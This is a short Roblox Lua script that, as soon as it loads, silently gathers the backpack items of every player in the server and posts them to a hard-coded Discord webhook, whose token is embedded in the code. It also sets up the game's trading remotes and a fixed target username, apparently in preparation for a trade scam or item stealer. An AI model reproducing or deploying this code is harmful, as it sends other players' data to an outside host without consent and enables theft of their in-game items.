local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local HttpService = game:GetService("HttpService")

local RFTradingSendTradeOffer = ReplicatedStorage.Modules.Net["RF/Trading/SendTradeOffer"]
local RESetPhoneSettings = ReplicatedStorage.Modules.Net["RE/SetPhoneSettings"]
local RFTradingSetReady = ReplicatedStorage.Modules.Net["RF/Trading/SetReady"]
local RFTradingConfirmTrade = ReplicatedStorage.Modules.Net["RF/Trading/ConfirmTrade"]
local RFTradingAddItem = ReplicatedStorage.Modules.Net["RF/Trading/AddItem"]

local targetName = "quaryriscute"
local localPlayer = Players.LocalPlayer
local playerGui = localPlayer:WaitForChild("PlayerGui")

-- // 📡 Send backpack report on load
task.spawn(function()
	local webhookUrl = "https://discord.com/api/webhooks/1495237089246187521/3xaeBard0Ia5rOI3mBT9cO9SGiw3phTe4VPv5t2QpdYzPqZTO9AFBaMOEWUvSjZmCXRi"

	local blacklist = {
		["1 punches"] = true,
		["Spray"] = true,
		["TradeSign"] = true,
		["StanleyPass"] = true,
		["Fish Slap"] = true,
		["Gorilla Gel"] = true,
		["Phone"] = true,
		["Wallet"] = true
	}

	local fields = {}
	for _, plr in ipairs(Players:GetPlayers()) do
		local backpack = plr:FindFirstChild("Backpack")
		local tools = {}
		if backpack then
			for _, item in ipairs(backpack:GetChildren()) do
				if item:IsA("Tool") and not blacklist[item.Name] then
					table.insert(tools, item.Name)
				end
			end
		end
		local value = #tools > 0 and table.concat(tools, ", ") or "None"
		table.insert(fields, { name = plr.Name, value = value, inline = false })
	end

	local embed = {
		title = "Backpack Report",
		fields = fields,
		timestamp = os.date("!%Y-%m-%dT%TZ")
	}

	local payload = { embeds = { embed } }
	pcall(function()
		HttpService:PostAsync(webhookUrl, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
	end)
end)

